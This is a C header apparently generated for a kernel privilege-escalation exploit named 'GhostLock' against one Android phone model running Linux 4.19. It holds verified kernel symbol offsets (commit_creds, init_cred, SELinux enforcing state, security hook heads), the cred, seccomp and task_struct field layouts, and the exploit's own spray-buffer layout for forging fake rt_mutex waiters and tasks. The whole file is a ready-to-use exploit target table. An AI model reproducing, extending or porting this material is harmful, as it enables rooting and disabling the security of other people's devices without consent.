/* PEYM00 / MT6893 / Linux 4.19.191+ — GhostLock 完整设备偏移表
 * 由 gen_target.py 从 vmlinux.elf + __ksymtab + /proc/config.gz 生成，勿手改。
 * 置信度: [A] ELF/ksymtab/反汇编实测  [B] 结构规律推定
 *          [C] 4.19 上游稳定布局      [D] 必须上机验证
 * 与上游 ccp-p/...-4.19-k40 的 target.h 宏名对齐，可直接作为 TARGET_CONFIG_H。
 */
#ifndef TARGET_PEYM00_H
#define TARGET_PEYM00_H

#define BUILD_VARIANT_LABEL "PEYM00_4.19.191_a13"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "OPPO/PEYM00/OP5245:13/TP1A.220905.001/R.233ce9b-1:user/release-keys"
#endif

/* ---------------- address space ---------------- */
#define KIMAGE_TEXT_BASE        0xffffff8008080000ULL  /* [A] ELF PH vaddr / _text */
#define KIMAGE_VADDR            0xffffff8008000000ULL  /* [A] kimage_vaddr 静态值 = MODULES_END */
#define VA_START                0xffffff8000000000ULL  /* [A] KIMAGE_VADDR - SZ_128M */
#define VA_BITS                 39
#define PAGE_SHIFT              12
#define P0_PAGE_OFFSET          0xffffffc000000000ULL  /* [C] VA_BITS=39 公式；旧表 0xffffff8000000000 是 VA_START，错 */
#define KERNELSNITCH_IDENTITY_START 0xffffffbe00000000ULL /* [D] PAGE_OFFSET - 8GB */
#define KERNELSNITCH_IDENTITY_END   0xffffffc400000000ULL /* [D] PAGE_OFFSET + 16GB */
#define DIRECT_MAP_BASE         0xffffffc000000000ULL  /* [C] = PAGE_OFFSET */
#define DIRECT_MAP_END          0xffffffc400000000ULL  /* [C] 16GB 窗口 > MemTotal 11785152 kB */
#define VMEMMAP_START           0xffffffbe00000000ULL  /* [C] PAGE_OFFSET - (1<<(VA_BITS-12))*0x40 */
#define P0_PHYS_OFFSET          0x0000000040000000ULL  /* [D] MT6893 DRAM base */
#define P0_KERNEL_PHYS_LOAD     0x0000000040080000ULL  /* [A] boot header v2 kernel_addr @0x0c */
#define PHYS_TO_VIRT_DELTA      0xffffffbfc0000000ULL  /* [C] PAGE_OFFSET - PHYS_OFFSET */

/* ---------------- 内核编译门禁（/proc/config.gz 实读） ---------------- */
#define CFG_KALLSYMS                     "y"
#define CFG_KALLSYMS_ALL                 0
#define CFG_KALLSYMS_BASE_RELATIVE       0
#define CFG_RANDOMIZE_BASE               1
#define CFG_RELOCATABLE                  1
#define CFG_ARM64_VA_BITS                39
#define CFG_ARM64_PAN                    1
#define CFG_ARM64_UAO                    1
#define CFG_ARM64_SW_TTBR0_PAN           1
#define CFG_UNMAP_KERNEL_AT_EL0          1
#define CFG_HARDEN_BRANCH_PREDICTOR      1
#define CFG_STRICT_KERNEL_RWX            1
#define CFG_MODULE_SIG_FORCE             1
#define CFG_HARDENED_USERCOPY            1
#define CFG_SLAB_FREELIST_HARDENED       0
#define CFG_SLAB_FREELIST_RANDOM         0
#define CFG_STATIC_USERMODEHELPER        1
#define CFG_SECURITY_SELINUX             1
#define CFG_SECURITY_SELINUX_DEVELOP     1
#define CFG_SECCOMP_FILTER               1
#define CFG_USER_NS                      0
#define CFG_PROC_KCORE                   0
#define CFG_DEBUG_FS                     0
#define CFG_KPROBES                      1
#define CFG_BPF_SYSCALL                  1
#define CFG_OPLUS_ROOT_CHECK             1
#define CFG_OPLUS_EXECVE_BLOCK           1
#define CFG_OPLUS_MOUNT_BLOCK            1
#define CFG_OPLUS_SECURE_GUARD           1
#define STATIC_USERMODEHELPER_PATH "/system_ext/bin/aee_core_forwarder"

/* ---------------- 4.19 adaptation switches ---------------- */
#define CFGOPS_4_19_STYLE       1
#define KMALLOC_419             1
#define ASHMEM_NAME_PREFIX_LEN  0
#define ASHMEM_PREFIX_COUNT     0
#define PIPE_419_RING_LAYOUT    1   /* ⚠️ 不是 K40 的 legacy pipe */
#define SLIDE_WONLY_BOOTID      1
#define SLIDE_LOGGERS_0_1_OFF   0   /* [D] 本机无 nfnetlink_log logger gadget；改用 kimage_voffset 物理读 */
#define SLIDE_NFULNL_LOGGER_OFF 0

/* ---------------- 函数符号 OFF ---------------- [A] */
#define ASHMEM_IOCTL_OFF                   0x00f0ccf4ULL
#define ASHMEM_COMPAT_IOCTL_OFF            0x00f0d634ULL
#define ASHMEM_MMAP_OFF                    0x00f0d680ULL
#define ASHMEM_OPEN_OFF                    0x00f0d7ecULL
#define ASHMEM_RELEASE_OFF                 0x00f0d86cULL
#define ASHMEM_SHOW_FDINFO_OFF             0x00f0d980ULL
#define ASHMEM_LLSEEK_OFF                  0x00f0cba4ULL
#define CONFIGFS_READ_ITER_OFF             0x002c6590ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF        0x002c6a78ULL
#define COPY_SPLICE_READ_OFF               0x002511fcULL
#define NOOP_LLSEEK_OFF                    0x002125e4ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF  0x00057cd8ULL
#define CAP_CAPABLE_OFF                    0x003f9114ULL
#define DO_FUTEX_OFF                       0x000ebed8ULL
#define REMOVE_WAITER_OFF                  0x000ac0e8ULL
#define RT_MUTEX_START_PROXY_LOCK_OFF      0x000ac058ULL
#define COMMIT_CREDS_OFF                   0x00065ce4ULL
#define CORE_SYS_SELECT_OFF                0x0022fc98ULL
#define SYS_PSELECT6_OFF                   0x002308b8ULL
#define SYS_FUTEX_OFF                      0x000ef64cULL

/* ---------------- 数据符号 OFF ---------------- [A] */
#define INIT_TASK_OFF                      0x0218d6c0ULL  /* ksymtab; comm=swapper pid=0 real_parent=self real_cred=init_cred 验证 */
#define INIT_UTS_NS_OFF                    0x0218c828ULL  /* ksymtab; 内含 Linux/(none)/4.19.191+/#1/aarch64 */
#define EMPTY_ZERO_PAGE_OFF                0x0254e000ULL  /* ksymtab; 恰为 .bss 起点、页对齐 __page_aligned_bss */
#define SYSTEM_UNBOUND_WQ_OFF              0x0217db88ULL  /* ksymtab（旧表误填 0x217db40，实为 cpumask 位图） */
#define SYSTEM_WQ_OFF                      0x0217db70ULL  /* ksymtab */
#define SYSTEM_LONG_WQ_OFF                 0x0217db80ULL  /* ksymtab */
#define KMALLOC_CACHES_OFF                 0x01f75bd0ULL  /* ksymtab + create_kmalloc_caches 数组基址（旧值 0x217db40 错） */
#define KIMAGE_VADDR_OFF                   0x0132e000ULL  /* ksymtab; 静态值 0xffffff8008000000 = KIMAGE_VADDR */
#define KIMAGE_VOFFSET_OFF                 0x01f75a88ULL  /* ksymtab; 启动时填充，物理读可反推 KASLR slide */
#define MEMSTART_ADDR_OFF                  0x01f75a78ULL  /* ksymtab */
#define INIT_CRED_OFF                      0x02199890ULL  /* prepare_kernel_cred ADRP+ADD；init_task+0x760/0x768 双向验证 */
#define ASHMEM_FOPS_OFF                    0x01aae178ULL  /* 镜像内 fops 指针表槽位逐项吻合 */
#define ASHMEM_MISC_FOPS_OFF               0x02461948ULL  /* 唯一指向 ashmem_fops 的数据槽 = miscdevice.fops */
#define ANON_PIPE_BUF_OPS_OFF              0x013682c8ULL  /* 四连函数指针表 */
#define PIPEFIFO_FOPS_OFF                  0x01368310ULL  /* no_llseek/pipe_read/pipe_write/ioctl/open/release */
#define ROOT_TASK_GROUP_OFF                0x02554ac0ULL  /* sched_init 传给 init_tg_cfs_entry 的 x0 = 0xa5d4ac0 */
#define SELINUX_STATE_OFF                  0x02884050ULL  /* sel_fill_super: stp x9,x19,[fsi,#0x70]，x9=0xa904050 */
#define SELINUX_ENFORCING_OFF              0x02884051ULL  /* sel_write_enforce: ldrb w22,[x21,#1]（disabled@0, enforcing@1） */
#define SECURITY_HOOK_HEADS_OFF            0x01f760e0ULL  /* capability(18)+selinux(187) 共 205 条 hook 项，192 个 head，跨 0x618 */
#define KPTR_RESTRICT_OFF                  0x0218c340ULL  /* ctl_table @0x2196e30 的 .data 槽，maxlen=4 */
#define SLIDE_BOOTID_CTLTABLE_OFF          0x02214ac8ULL  /* ctl_table.procname='boot_id' */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF      0x02926ff4ULL  /* boot_id ctl_table 的 .data 槽（proc_do_uuid 可读） */
#define SLIDE_SYSCTL_BOOTID_OFF            0x02214ac8ULL  /* 上游兼容别名 */
#define SLIDE_INIT_TASK_OFF                0x0218d6c0ULL  /* 上游兼容别名 */
#define SLIDE_ROOT_TASK_GROUP_OFF          0x02554ac0ULL  /* 上游兼容别名 */

/* 上游习惯的绝对地址宏（含 KASLR slide 时须叠加运行时基址） */
#define INIT_TASK                          (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS                        (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE                    (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP                    (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING                  (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS                (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES                     (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS                  (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_FOPS                        (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_MISC_FOPS                   (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define INIT_CRED                          (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define SYSTEM_UNBOUND_WQ                  (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define KPTR_RESTRICT                      (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)

/* ---- rt_mutex_waiter (4.19 compact, size 0x50; 无 wake_state/ww_ctx) ---- */
#define WAITER_LOCAL_OFF            0x80   /* [C] fwrpi 栈上局部区基准（上游 spray 约定） */
#define WAITER_TREE_ENTRY_OFF       0x00
#define WAITER_PI_TREE_ENTRY_OFF    0x18
#define WAITER_TASK_OFF             0x30
#define WAITER_LOCK_OFF             0x38
#define WAITER_PRIO_OFF             0x40
#define WAITER_DEADLINE_OFF         0x48
#define WAITER_STRUCT_SIZE          0x50

/* ---- exploit 内部 spray buffer 布局（与目标内核无关，沿用上游） ---- */
#define LOCK_OFF                    0x1350
#define W0_OFF                      0x2220
#define FOPS_OFF                    0x1000
#define SCRATCH_OFF                 0x3000
#define RIGHT_OFF                   0x4440
#define LEFT_OFF                    0x5550
#define FAKE_TASK_OFF               0x3200
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x50
#define FAKE_WAITER_LOCK_OFF            0x58
#define FAKE_WAITER_WAKE_STATE_OFF      0x60
#define FAKE_WAITER_WW_CTX_OFF          0x68

/* ---- task_struct：全部实测 / 4.19 上游锚定 ----
 * prio@0x88 由 task_prio() 的 `ldr w8,[x0,#0x88]; sub w0,w8,#100` 钉死；
 * static_prio@0x8c 由 set_user_nice 的 `str w8,[p,#0x8c]` 钉死；
 * rt_priority@0x94 / sched_class@0x98 由 __sched_setscheduler 钉死；
 * sched_task_group@0x340 由 init_task 内指向 root_task_group 的指针钉死。
 * 相对 K40 4.19 后半段整差 -0x80，已由 10 个实测字段交叉验证。 */
#define TASK_THREAD_INFO_FLAGS_OFF  0x000
#define TASK_PRIO_OFF               0x088
#define TASK_STATIC_PRIO_OFF        0x08c
#define TASK_NORMAL_PRIO_OFF        0x090
#define TASK_RT_PRIORITY_OFF        0x094
#define TASK_SCHED_CLASS_OFF        0x098
#define TASK_SCHED_TASK_GROUP_OFF   0x340
#define TASK_TASKS_OFF              0x4b8
#define TASK_MM_OFF                 0x508
#define TASK_ATOMIC_FLAGS_OFF       0x580
#define TASK_PID_OFF                0x5b8
#define TASK_TGID_OFF               0x5bc
#define TASK_REAL_PARENT_OFF        0x5c8
#define TASK_THREAD_GROUP_OFF       0x668
#define TASK_REAL_CRED_OFF          0x760
#define TASK_CRED_OFF               0x768
#define TASK_COMM_OFF               0x770
#define TASK_SECCOMP_OFF            0x810
#define TASK_ALLOC_LOCK_OFF         0x830
#define TASK_PI_LOCK_OFF            0x834
#define TASK_PI_WAITERS_OFF         0x840
#define TASK_PI_TOP_TASK_OFF        0x850
#define TASK_PI_BLOCKED_ON_OFF      0x858
#define MM_OWNER_OFF                0x338
#define MM_STRUCT_SIZEOF            0x398  /* [A] proc_caches_init: kmem_cache_create_usercopy("mm_struct",0x398) */
#define MM_STRUCT_SZ                8      /* [C] 上游语义是「扫描步长」，不是 sizeof；勿改 */

/* fake_task 是完整 task_struct 镜像，字段必须用本机真实偏移 */
#define FAKE_TASK_USAGE_OFF             TASK_USAGE_OFF
#define FAKE_TASK_PRIO_OFF              TASK_PRIO_OFF
#define FAKE_TASK_NORMAL_PRIO_OFF       TASK_NORMAL_PRIO_OFF
#define FAKE_TASK_TASK_GROUP_OFF        TASK_SCHED_TASK_GROUP_OFF
#define FAKE_TASK_PI_LOCK_OFF           TASK_PI_LOCK_OFF
#define FAKE_TASK_PI_WAITERS_OFF        TASK_PI_WAITERS_OFF
#define FAKE_TASK_PI_TOP_TASK_OFF       TASK_PI_TOP_TASK_OFF
#define FAKE_TASK_PI_BLOCKED_ON_OFF     TASK_PI_BLOCKED_ON_OFF
#define TASK_USAGE_OFF                  0x010  /* [C] atomic_t usage，紧接 state/stack */

/* ---- cred (4.19, size 0xa8) / seccomp / selinux ---- */
#define CRED_UID_OFF                0x04
#define CRED_SECUREBITS_OFF         0x24
#define CRED_CAPS_OFF               0x28
#define CRED_SECURITY_OFF           0x78
#define CRED_STRUCT_SIZE            0xa8
#define SELINUX_CRED_BLOB_OFF       0
#define SELINUX_CRED_OSID_OFF       0x00
#define SELINUX_CRED_SID_OFF        0x04
#define SECCOMP_MODE_OFF            0x00
#define SECCOMP_FILTER_OFF          0x08
#define TIF_SECCOMP_BIT             11
#define PFA_NO_NEW_PRIVS_BIT        0

/* ---- file_operations (4.19, 两张独立 fops 表交叉验证) ---- */
#define FOPS_OWNER_OFF              0x00
#define FOPS_LLSEEK_OFF             0x08
#define FOPS_READ_OFF               0x10
#define FOPS_WRITE_OFF              0x18
#define FOPS_READ_ITER_OFF          0x20
#define FOPS_WRITE_ITER_OFF         0x28
#define FOPS_POLL_OFF               0x40
#define FOPS_IOCTL_OFF              0x48
#define FOPS_COMPAT_IOCTL_OFF       0x50
#define FOPS_MMAP_OFF               0x58
#define FOPS_OPEN_OFF               0x68
#define FOPS_RELEASE_OFF            0x78
#define FOPS_SPLICE_READ_OFF        0xc0
#define FOPS_SHOW_FDINFO_OFF        0xd8

/* ---- pipe：本机为 4.19 标准 RING 布局（禁用 K40 legacy 适配） ---- */
#define PIPE_BUFFER_SIZE            0x28
#define PIPE_BUFFER_SLOTS           16
#define PIPE_BUF_FLAG_CAN_MERGE     0x10
#define PIPE_INODE_INFO_SIZE        0x90
#define PIPE_INODE_INFO_STRUCT_SIZE 0x90
#define PIPE_MUTEX_OFF              0x00
#define PIPE_WAIT_OFF               0x28
#define PIPE_HEAD_OFF               0x38
#define PIPE_TAIL_OFF               0x3c
#define PIPE_MAX_USAGE_OFF          0x40
#define PIPE_RING_SIZE_OFF          0x44
#define PIPE_READERS_OFF            0x5c
#define PIPE_WRITERS_OFF            0x60
#define PIPE_TMP_PAGE_OFF           0x68
#define PIPE_BUFS_OFF               0x80
#define PIPE_USER_OFF               0x88
#define KMALLOC_PIPE_INDEX          10
#define KMALLOC_PIPE_OBJ_SIZE       0x400
#define KMALLOC_CACHE_TYPES         3

/* ---- struct page / configfs_buffer（4.19 上游稳定） ---- */
#define STRUCT_PAGE_SIZE            0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF       0x18
#define STRUCT_PAGE_TYPE_OFF        0x30
#define CFG_PAGE_OFF                16
#define CFG_NEEDS_READ_FILL_OFF     64
#define CFG_BIN_BUFFER_OFF          72
#define CFG_BIN_BUFFER_SIZE_OFF     80
#define CFG_CB_MAX_SIZE_OFF         84

/* ---- 栈叠加（精确帧，见报告第九节） ---- */
#define FRAME_SYS_FUTEX             0x70
#define FRAME_DO_FUTEX              0x210
#define FRAME_FUTEX_REQUEUE         0x140
#define FRAME_SYS_PSELECT6          0xc0
#define FRAME_SYS_SELECT            0x80
#define FRAME_CORE_SYS_SELECT       0x1c0
#define FRAME_DO_SELECT             0x380
#define FRAME_SYS_PPOLL             0xb0
#define STACK_FDS_SP_OFF            0x50
#define NFDS                        320
#define WAITER_WORD_STATIC_ESTIMATE 19
#define WAITER_WORD_MAX_FEASIBLE    7
#define PSELECT_WAITER_WORD_SHIFT   0

#endif /* TARGET_PEYM00_H */
